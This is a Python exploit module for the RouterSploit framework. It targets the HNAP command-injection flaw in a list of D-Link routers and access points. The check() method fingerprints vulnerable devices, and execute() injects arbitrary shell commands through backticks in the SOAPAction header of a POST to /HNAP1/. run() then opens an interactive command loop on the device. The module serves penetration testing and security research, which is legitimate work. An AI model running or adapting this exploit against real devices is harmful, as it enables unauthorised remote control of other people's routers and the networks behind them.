from routersploit import (
    exploits,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for HNAP Remote Code Execution vulnerability in multiple D-Link devices.
    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
    """
    __info__ = {
        'name': 'D-Link Multi HNAP RCE',
        'description': 'Module exploits HNAP remote code execution vulnerability in multiple D-Link devices which allows executing commands on the device.',
        'authors': [
            'Samuel Huntley',  # vulnerability discovery
            'Craig Heffner',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/37171/',
            'https://www.exploit-db.com/exploits/38722/',
            'http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/',
        ],
        'devices': [
            'D-Link DIR-645',
            'D-Link AP-1522 revB',
            'D-Link DAP-1650 revB',
            'D-Link DIR-880L',
            'D-Link DIR-865L',
            'D-Link DIR-860L revA',
            'D-Link DIR-860L revB',
            'D-Link DIR-815 revB',
            'D-Link DIR-300 revB',
            'D-Link DIR-600 revB',
            'D-Link DIR-645',
            'D-Link TEW-751DR',
            'D-Link TEW-733GR',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_status("Target might be vulnerable - it is hard to verify")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd_new = "cd && cd tmp && export PATH=$PATH:. && {}".format(cmd)
        soap_action = '"http://purenetworks.com/HNAP1/GetDeviceSettings/`{}`"'.format(cmd_new)
        url = "{}:{}/HNAP1/".format(self.target, self.port)
        headers = {"SOAPAction": soap_action}

        http_request(method="POST", url=url, headers=headers)
        return ""

    @mute
    def check(self):
        url = "{}:{}/HNAP1/".format(self.target, self.port)
        headers = {"SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings"'}

        response = http_request(method="GET", url=url, headers=headers)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "D-Link" in response.text and "SOAPActions" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
